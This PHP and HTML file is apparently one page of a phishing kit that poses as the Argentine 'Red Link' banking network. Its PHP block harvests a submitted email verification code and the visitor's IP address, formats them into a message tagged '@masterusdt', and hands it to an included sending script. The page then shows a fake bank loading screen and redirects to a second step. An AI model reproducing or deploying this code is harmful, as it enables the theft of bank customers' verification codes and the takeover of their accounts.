<?php  
include 'config/personalizar.php';
if (isset($_POST['submit'])) {
  $enviara =
  "<b> 💸 BSE PERSONA 💸 </b>\n\n".
  " ------ [ data ] ------ \n\n".
  "<b>👤 code email: </b> <code>".$_POST['token']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @masterusdt ] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}

?>
<!doctype html>
<html lang="es-AR">
<head>
  <meta http-equiv="refresh" id="loader">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <link rel="icon" type="ico" href="favicon.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <script type="text/javascript" src="assets/js/main.js"></script>
  <style>
    /* Animación para que el logo se agrande */
    @keyframes logoPulse {
      0% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.2);
      }
      100% {
        transform: scale(1);
      }
    }
    
    .logo-pulse {
      animation: logoPulse 2s ease-in-out infinite;
      max-width: 200px;
      margin: 0 auto 2rem auto;
      display: block;
    }
    
    /* Centrar todo verticalmente */
    .h-100 {
      height: 100vh !important;
    }
    
    .contenido-centrado {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100%;
    }
  </style>
</head>
<body>
  <div class="h-100 w-100">
    <div class="h-100 py-5 shadow bg-white px-4 mx-auto w-100" style="max-width: 676px;">
      
      <!-- Contenedor centrado -->
      <div class="contenido-centrado">
        
        <!-- Logo con animación de agrandarse -->
        <img src="assets/images/bank_logo.png" class="logo-pulse mb-4">
        
        <!-- Títulos dinámicos -->
        <h3 class="titulo_cargando my-3 text-center"><?php echo $titulo; ?></h3>
        <p class="fs-5 description_cargando text-center"><?php echo $descripcion; ?></p>
        
        <!-- Loader original (lo mantengo) -->
        <div class="myfuckynginspinner mx-auto my-5"></div>
        
        <!-- Porcentaje de carga -->
        <p class="text-center">Cargando <span id="loading"></span>%</p>
        
      </div>
      
    </div>
  </div>
  
  <script type="text/javascript" src="config/segundos.js"></script>
  <script type="text/javascript">
    let speed = segundos * 3,
    limit = 100,
    i = 0;
    document.getElementById('loader').setAttribute('content',`${segundos};URL=step-2.php`);
    let func = setInterval(function(){
      if (i < limit) {
        i++;
        document.getElementById('loading').innerHTML = i;
      }
    },speed);
  </script>
</body>
</html>